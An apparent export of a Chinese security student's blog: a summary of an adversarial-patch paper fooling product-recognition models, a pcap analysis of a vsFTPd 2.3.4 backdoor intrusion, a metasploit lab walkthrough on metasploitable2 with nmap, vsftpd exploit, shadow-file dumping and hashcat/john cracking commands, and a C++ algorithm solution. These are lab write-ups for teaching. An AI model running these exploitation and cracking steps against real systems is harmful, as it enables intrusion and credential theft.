+<p><strong>类原型(prototype)：</strong>一种包含数据集中某一类的语义信息的典型表示，其代表了某一类别的深层特征，对模型而言，这种类原型会使得模型产生语义上的偏见，通过引入类原型，可以训练对抗补丁利用这种固有的语义上的偏见实现对模型的欺骗行为。</p>
+<p>类别t的类原型目标函数如下：<br>$$<br>I_t = arg_xmin\frac{1}{C}\sum_{c\neq t}max(0,margin-S_t(x)+S_c(x))^p\<br>S_t(x)代表输入x的类别t的logits，由模型的分类层计算\<br>C是类的总数，margin是控制多类边距的阈值<br>$$<br>为了生成对抗补丁，我们引入<b>对抗攻击损失(adversarial attack loss)</b>，定义如下：<br>$$<br>L_t = E_{I,\delta^{adv}}[P(c=t|I’) - max(P(c\neq t|I’))]\<br>\delta^{adv}是由纹理先验\delta^*得到的对抗补丁，P(\cdot)是目标模型对输入的预测值\<br>I’是类原型I加对抗补丁\delta^{adv}的混合图片，c代表class(类)，t是I的类<br>$$<br>此外，研究表明对抗样本对环境条件无效，而真实世界的图片输入总是伴随着不同的环境条件，这会影响我们的攻击成功率，因此我们引入<b>期望转换(expectation of transformations)</b>来提高攻击成功率，如上式中条件期望c所示。</p>
+</li>
+</ol>
+<p>整个框架算法如下图：</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402010350908.png" alt="image-20210402010350908"></p>
+<h3 id="三、测验"><a href="#三、测验" class="headerlink" title="三、测验"></a>三、测验</h3><ol>
+<li><p><strong>数据集和检测标准</strong></p>
+<p>使用RPC数据集（目前为止应用于ACO的最大的商品数据集）</p>
+<p>使用分类准确性作为检测标准，分为top-1,top-3,top-5三档</p>
+</li>
+<li><p><strong>测验设置</strong></p>
+<p>输入图片大小512*512，补丁大小32*32</p>
+<p>使用学习率0.01，权重衰减$10^{-4}$，最大50个epochs的Adam optimizer优化损失，使用200个hard examples优化我们的融合先验，使用如下的transformations来优化我们补丁的泛化攻击能力：</p>
+<ul>
+<li><strong>旋转</strong> 旋转角度范围在$[-30^{\circ},30^{\circ}]$</li>
+<li><strong>失真</strong> 失真率控制参数范围$[0,0.1]$</li>
+<li><strong>仿射变换</strong> 仿射率在0~4之间</li>
+</ul>
+<p>代码构建于Pytorch之上</p>
+<p>我们选择目前最先进的对抗补丁策略来与我们的框架效果进行对比</p>
+</li>
+<li><p><strong>数字世界攻击</strong></p>
+<p><strong>白盒攻击：</strong>我们使用ResNet-152模型来生成对抗补丁并攻击这个模型本身，并使用白补丁作为对照样本，结果如下图，我们的攻击效果更好（即模型分辨准确率更低）</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402091457294.png" alt="image-20210402091457294"></p>
+<p><strong>黑盒攻击：</strong>我们使用ResNet-152模型来生成对抗补丁并用它攻击其他的模型，结果如下表，我们的补丁效果更好。</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402091633896.png" alt="image-20210402091633896"></p>
+<p>此外下图展现了几种补丁生成策略的训练过程，我们补丁生成过程很快完成并达到稳定，其他的策略在经过一段时间后仍然会有抖动。</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402091910858.png" alt="image-20210402091910858"></p>
+</li>
+<li><p><strong>真实世界攻击</strong></p>
+<p>使用淘宝和京东平台作为攻击模型，输入为4种商品的80张照片（在不同环境之下）</p>
+<p>结果：在不加补丁时，淘宝和京东的识别率分别为100%和95%；加了我们的补丁之后，两个平台的识别率降低为56.25%和55%。这个结果证明了我们补丁在现实世界中的攻击能力。</p>
+</li>
+<li><p><strong>泛化能力</strong></p>
+<p>我们通过测试补丁对<strong>未知类别</strong>的攻击能力来测试补丁的泛化攻击能力。</p>
+<p>对训练模型来说未知的类别：我们选择数据集的子集来训练，未纳入训练的数据对于模型则是未知的。结果如下表，我们的补丁效果最好。</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402093524045.png" alt="image-20210402093524045"></p>
+<p>对目标模型来说未知的类别：我们使用RPC数据集训练我们的补丁，在淘宝平台展开攻击。我们选择4种不在ResNet-152认知范围内的物品进行不同环境的测试，结果发现淘宝识别率为65.63%。</p>
+</li>
+<li><p><strong>对纹理先验的分析</strong></p>
+<p><strong>由不同的先验开始训练：</strong>我们使用几种不同的先验来训练补丁，其余设置和数字世界攻击一致，结果纹理先验生成的补丁效果最好。</p>
+<p><strong>决策边界距离分析：</strong>数据点到决策边界的最小距离显示了模型对小噪声的鲁棒性，同样也展示了攻击的可行性。我们计算不同先验训练出来的最小距离，结果如下图，可见纹理先验生成的补丁数据点距离最小。</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402094330810.png" alt="image-20210402094330810"></p>
+</li>
+<li><p><strong>融合的分析</strong></p>
+<p><strong>类原型的效果：</strong>首先考虑不同比例的类原型和和普通图片混合对对抗样本攻击效果的影响，结果是类原型占比越高，效果越好，如下图所示：</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402095330228.png" alt="image-20210402095330228"></p>
+<p>接着考虑使用类原型和不使用类原型的情况下训练<strong>数据的需求量</strong>，结果如下表所示，可见要达到相同的攻击效果，不使用类原型需要更大的数据量才能做到。它表示类原型有更强的类代表能力。</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402095611814.png"></p>
+<p><strong>转换模型：</strong>我们使用单种转换模型和不适用转换模型来进行攻击能力的比对，结果如下表，可知使用转换模型能更提高攻击能力。</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210402100103515.png" alt="image-20210402100103515"></p>
+</li>
+</ol>
+<h3 id="四、项目的Github仓库"><a href="#四、项目的Github仓库" class="headerlink" title="四、项目的Github仓库"></a>四、项目的Github仓库</h3><p><a target="_blank" rel="noopener" href="https://github.com/liuaishan/ModelBiasedAttack">https://github.com/liuaishan/ModelBiasedAttack</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/05/17/ECCV2020/" data-id="ckr5o9zy70003xkur7b5m1r69" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/CV/" rel="tag">CV</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/adversarial-patch/" rel="tag">adversarial patch</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-流量分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/05/14/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="article-date">
+  <time datetime="2021-05-14T10:50:24.000Z" itemprop="datePublished">2021-05-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/05/14/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本次实验做对pcap包的流量分析，需要确定攻击主机ip，攻击手段，以及获取账户密码。</p>
+<p>靶机：192.168.2.222</p>
+<ol>
+<li><p>首先用wireshark打开pcap包，用统计功能查看ip数量及各自出现的次数。（统计-&gt;ipv4 statistics-&gt;all addresses）</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1.png"></p>
+<p>可以看到出现次数比较多的是这三个ip地址，而其中最多的是我们的靶机.222，我们可以猜测和他出现频率差不多并且在同一局域网内的192.168.2.183是攻击主机。</p>
+</li>
+<li><p>接着使用过滤功能查看和靶机192.168.2.222有关的流量信息，如图所示，可以看到183对222（靶机）的不同端口持续发送syn包。有的端口在靶机上未开放，靶机回复rst释放连接，183并没有再继续对该端口进行尝试；有的端口在靶机上开放了，靶机回复syn ack，183也没有再回复ack完成三次握手，只是一直对靶机的不同端口发送syn报文。很显然183是在对靶机进行端口扫描，查看哪些端口是开放的。据此我们基本上可以确定183就是攻击机。</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.png"></p>
+</li>
+<li><p>接下来的报文则是183对靶机所有开放端口进行三次握手建立连接，如图所示。</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.png"></p>
+</li>
+<li><p>再往下则是某些服务建立连接之后的一些操作，有一些靶机的DNS查询报文，有正向查询也有逆向查询，猜测是开放的服务的某些功能需要这么做。还有的比如TELNET还有IRC给攻击者发送了一些数据包，但是攻击者立刻中断了此tcp链接，可以知道这个并不是攻击者所需要的。因此我们知道，完成三次握手建立连接的这一过程，是为了判断开放的端口所提供的服务配置版本等信息，结合我们平常使用nmap端口扫描能够知道对应服务的版本号可以猜测到这一点。</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.png"></p>
+</li>
+<li><p>再到后面就是对某个端口服务漏洞的利用尝试，比如512端口，这部分比较长，而且不止一个服务，一个个分析容易白废功夫。我们直接从后面看起，看到底是哪一个漏洞成功获取到了账号密码。如图可以看到最后都是对6200端口的通讯，再往前看可以看到攻击机从靶机用FTP PORT命令下载了一个压缩包。</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/5.png"></p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/6.png"></p>
+</li>
+<li><p>我们想办法获取这个压缩包，首先找到它前面最近的TCP报文，右击-&gt;追踪流-&gt;TCP流，选择显示原始数据，将其保存到本地，格式为.tgz</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/7.png"></p>
+</li>
+<li><p>解压下载的压缩包可以看到passwd和shadow文件，查看文件可以得到root的口令密文是<code>$1$AEvN/LAF$UE4aDFyWJa.AzVZkDnflq0</code></p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/8.png"></p>
+</li>
+<li><p>既然是通过6200端口完成的攻击，我们就到6200端口最开始出现的地方分析攻击是怎么完成的。首先是对21号端口建立TCP连接，表示要访问FTP服务，而靶机的FTP报文回复告诉我们靶机使用vsFTPd2.3.4来作为FTP服务器。对vsFTPd2.3.4进行搜索可以发现对于这个版本的vsFTPd有一个后门漏洞，当用户登陆的时候在用户名后面加上笑脸就可以拿到shell的root权限，这个后门代码绑定的侦听端口是6200。继续往下看，攻击机发出的FTP请求中果然在用户名后包含笑脸，在输入了密码之后，攻击机重新开了新的端口32884和靶机的6200端口建立连接并且得到了回应，因此此时漏洞利用已经成功。</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/9.png"></p>
+</li>
+<li><p>接着攻击机用获取到的shell查询靶机的id信息，并且用命令nohup保持这个shell的运行。随后输入了echo命令测试shell的功能，此时原来用于连接vsFTPd服务的连接也被攻击机释放了。接着用uname -a查看了靶机的系统信息，用whoami查看了当前shell的权限。随后攻击机创建了一个叫newuser的用户，并设置了密码anewuser，其他用户信息一概默认。</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/10.png"></p>
+</li>
+<li><p>随后攻击机把shadow文件和passwd文件打包进了user.tgz文件夹中</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11.png"></p>
+<p>接着攻击机重新开了一个端口（控制连接）去连接FTP服务器（图上前三行），登陆时使用刚刚创建的newuser，并查询了服务器操作系统信息，设置了数据传输模式为二进制模式。随后试图使用PORT命令下载刚刚打包的user.gtz文件，但是失败了，用得到的shell端口检查后发现是打包的文件是root权限，普通的user无法下载它，于是修改文件权限后成功下载。FTP服务器开启20端口和PORT命令指定的端口号建立数据连接，准备进行数据传输。</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12.png"></p>
+<p>传输成功后就得到了我们的FTP-DATA报文，通过它就可以获得gtz包。后面就是退出命令，此时攻击者的目的已经达到了。</p>
+</li>
+<li><p>接下来我们需要通过获取的passwd文件获取root账户的密码，使用john the ripper工具进行密码破解，在kali中该工具存放字典的目录是/usr/share/john/password.lst，在其中加入提示的msf相关的可能口令。此外还需要将passwd文件中的root的密码存入一个新的txt中，因为我们只需要root的密文而不需要其他的。执行命令<code>john -- /usr/share/john/password.lst /root/etc/shadow.txt --format=md5crypt</code>破解密码，结果如下图，可知破解出来root账户的密码是adminmsf</p>
+<p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14.png"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/05/14/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-id="ckr5o9zzf002gxkurg38idvze" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-metasploit攻防" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/05/11/metasploit%E6%94%BB%E9%98%B2/" class="article-date">
+  <time datetime="2021-05-11T11:47:11.000Z" itemprop="datePublished">2021-05-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/05/11/metasploit%E6%94%BB%E9%98%B2/">metasploit攻防</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>使用metasploitable2作为靶机，kali版本：Linux kali 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64 GNU/Linux</p>
+<h3 id="攻击靶机获取账号密码"><a href="#攻击靶机获取账号密码" class="headerlink" title="攻击靶机获取账号密码"></a>攻击靶机获取账号密码</h3><p>同组人来修改自己靶机的密码（8位）并透露其中4位，自己攻击自己的靶机。</p>
+<p>本次我的靶机root密码中4位：2324，msfadmin密码中4位：1864</p>
+<ol>
+<li><p><strong>获得靶机ip</strong></p>
+<p>首先查看自己的靶机所在的局域网，使用<code>ifconfig</code>命令得到自己ip为192.168.253.135</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%811.png"></p>
+<p>使用命令<code>namp -sP 192.168.253.0/24</code>查看同一局域网内的主机并选择攻击目标</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%812.png"></p>
+<p>一般ip的头尾不会作为主机ip，因此先排除192.168.253.1，而最后一个192.168.253.135就是攻击机本身，故只剩下三个选择。尝试ping三个ip地址，发现254无法ping通，故排除。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%813.png"></p>
+<p>使用命令nmap -O 192.168.253.xxx扫描主机的操作系统，可以看见.2的os信息是VMware Player virtual NAT device，可知它不是metasploitable靶机；.137是Linux 2.6.9 - 2.6.33，而我们知道metasploitable的内核是linux2.6.24，很有可能这个ip就是靶机。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%814.png"></p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%815.png"></p>
+<p>metasploitable会开启http服务，直接将ip:192.168.253.137输入到浏览器中，可以看到出现了metasploitable的http服务，至此我们可以确定靶机ip为192.168.253.137</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%816.png"></p>
+</li>
+<li><p><strong>寻找靶机漏洞</strong></p>
+<ul>
+<li><p>使用命令<code>nmap -T4 -sV -v 192.168.253.137</code>扫描靶机开机的端口，可以看到靶机开启了如下端口，我们利用apache服务器的WebDAV漏洞进行攻击。WebDAV是基于Web服务的扩展服务。它允许用户像操作本地文件一样，操作服务器上的文件。借助该功能，用户很方便的在网络上存储自己的文件。为了方便用户使用，通常会提供给用户较大的文件权限，如上传、修改甚至是执行权限。</p>
+<p>  <img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%817.png"></p>
+<p>  Kali Linux提供了一款WebDAV服务漏洞利用工具DAVTest。该工具会自动检测权限，寻找可执行文件的权限。一旦发现，用户就可以上传内置的后门工具，对服务器进行控制。同时，该工具可以上传用户指定的文件，便于后期利用。davtest的帮助如下：</p>
+<p>  <img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%818.png"></p>
+<p>  使用命令<code>davtest -url davtest -url http://192.168.253.137/dav</code>寻找可执行文件的权限，可以看到php文件是可以成功执行的，那么我们就生成php木马。</p>
+<p>  <img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%819.png"></p>
+</li>
+<li><p>也可以利用vsftpd 2.3.4漏洞。vsftpd 是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux, BSD, Solaris, HP-UX 以及 IRIX 上面。它支持很多其他的 FTP 服务器不支持的特征。而vsftpd-2.3.4早期版本存在恶意的后门，我们可以直接利用它。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>利用漏洞</strong></p>
+<p>在初次启动metasploit的时候，需要打开postgresql数据库，命令<code>/etc/init.d/postgresql start</code>，想要开机自启则是<code>update-rc.d postgresql enable</code>。接着初次使用数据库服务时需初始化，以便创建系统默认的数据库及数据库用户；命令如下：<code>msfdb init</code>（默认创建的数据库名：msf，msf_test;用户名：msf；口令默认为空）。使用msfconsole即可开启msf。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8110.png"></p>
+<p>使用命令<code>search vsftpd</code>，可以看到msf中有可以利用的程序，使用它。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8111.png"></p>
+<p>输入命令<code>use exploit/unix/ftp/vsftpd_234_backdoor</code>，输入<code>show options</code>查看参数，需要rhost和rport参数。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8112.png"></p>
+<p>使用命令<code>set rhost 192.168.253.137</code>其中.137是我们的靶机，再次输入<code>show options</code>查看参数情况。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8113.png"></p>
+<p>直接输入<code>exploit</code>利用它，可以看到获取了shell，并且是root权限。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8114.png"></p>
+</li>
+<li><p><strong>获取密码</strong></p>
+<p><strong>/etc/passwd</strong>是获取用户的地方，语法格式：name:password:uid:gid:comment:home:shell。其中name是登录名，passwd是用户口令（加密的，通常用x表示），uid是指定用户的uid，gid是组id，comment用来保存用户的真实姓名和个人细节，home指定用户的主目录的绝对路径，shell默认使用的shell。</p>
+<p>可以看到root账户和msfadmin账户，其他都是伪用户。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8115.png"></p>
+<p><strong>/etc/shadow</strong>文件是只有系统管理员才有权利进行查看和修改的文件，其中的记录行与/etc/passwd中的一一对应，它由pwconv命令根据/etc/passwd中的数据自动产生，语法格式：username: passwd: lastchg: min: max: warn: inactive: expire: flag。username是与/etc/passwd文件中的登录名相一致的用户账号，passwd字段存放的是加密后的用户口令字，长度为13个字符；如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合{./0-9A-Za-z}中的字符，则对应的用户不能登录，lastchg表示的是从某个时刻起，到用户最后一次修改口令时的天数，min指的是两次修改口令之间所需的最小天数。(0代表任何时候可以修改)，max指的是口令保持有效的最大天数。（1代表永远不能修改），warn字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。（-1代表没有警告），inactive表示的是用户没有登录活动但账号仍能保持有效的最大天数。（-1永远不会禁止），expire字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了，flag保留以后使用。</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8116.png"></p>
+<p>可以得到root用户的加密口令是<code>$1$VPC6Fq2x$q8t.HI6Rfm/fw2vwiE6pK.</code>，msfadmin用户的加密口令是<code>$1$fdA35sR0$csJypy26ZhgApL.zj0qGR1</code></p>
+<p>其中加密后的口令语法格式为：<code>$id$salt$encrypted</code>，id为1时，采用md5算法加密；id为5时，采用SHA256算法加密；id为6时，采用SHA512算法加密；salt为盐值,是对密码进行hash的一个干扰值；encrypted为散列值。</p>
+<p>将上述两个口令保存到文件root.txt和user.txt中，使用命令<code>hashcat -m 500 -a 3 /root/root.txt ?l?l?l?l2324 --force</code>完成破解，结果如图所示：</p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8117.png"></p>
+<p><img src="metasploit%E6%94%BB%E9%98%B2/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%8118.png"></p>
+<p>root账户的密码是swyy2324，msfadmin账户的密码是yyws1864</p>
+</li>
+</ol>
+<p>最后将整个exploit过程的流量包用wireshark抓包之后保存为pcapng格式即可。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/05/11/metasploit%E6%94%BB%E9%98%B2/" data-id="ckr5o9zyl000mxkur3obo0xml" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/metasploit/" rel="tag">metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-洛谷" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/04/27/%E6%B4%9B%E8%B0%B7/" class="article-date">
+  <time datetime="2021-04-27T15:18:08.000Z" itemprop="datePublished">2021-04-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%AE%97%E6%B3%95/">算法</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/04/27/%E6%B4%9B%E8%B0%B7/">洛谷</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h3><p><strong>p1167</strong></p>
+<p>输入两个日期如：2007-2-12-01:01，2018-3-15-03:02，计算在这段时间内最多可以做的题数。总题数N，每题需要花的时间t1逐行给出。</p>
+<p><strong>解法1：</strong>这题关键点1.计算两个日期之间的分钟数 2.求最多可以做的题数。</p>
+<p>1.计算两个日期之间的分钟数，首先采用结构date以整数的方式读取年月日时分。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">date</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> year;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> day;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hour;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> minute;</span><br><span class="line">&#125;date;</span><br><span class="line">date d1,d2;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%u-%u-%u-%u:%u&quot;</span>, &amp;d1.year, &amp;d1.month, &amp;d1.day, &amp;d1.hour, &amp;d1.minute);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%u-%u-%u-%u:%u&quot;</span>, &amp;d2.year, &amp;d2.month, &amp;d2.day, &amp;d2.hour, &amp;d2.minute);</span><br></pre></td></tr></table></figure>
+
+<p>接着计算两个时间之间隔了多少天，采用<strong>多退少补</strong>的方法计算。就题目中的例子，假定开始的时间是2007年1月1日0点0分，结束的时间是2018年1月1日0点0分，这样计算了中间隔了多少天。（闰年+366，非闰年+365）接着对于第一个日期多余的月日，减去；对于第二个日期多余的月日，加上。注意加上月日的时候，可以将每月对应的最大天数记录在days数组中，这样月份就可以对应日期。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> days[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> days_leap[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">leap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> year)</span><span class="comment">//判断闰年</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) || year % <span class="number">400</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">calculate_day</span><span class="params">(date d1,date d2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> y1 = d1.year,y2 = d2.year;</span><br><span class="line">    <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i = y1; i &lt; y2; i++)<span class="comment">//计算年份</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">leap</span>(i))</span><br><span class="line">        &#123;</span><br><span class="line">            sum += <span class="number">366</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += <span class="number">365</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> m1 = d1.month,m2 = d2.month;</span><br><span class="line">    <span class="keyword">for</span>(<span 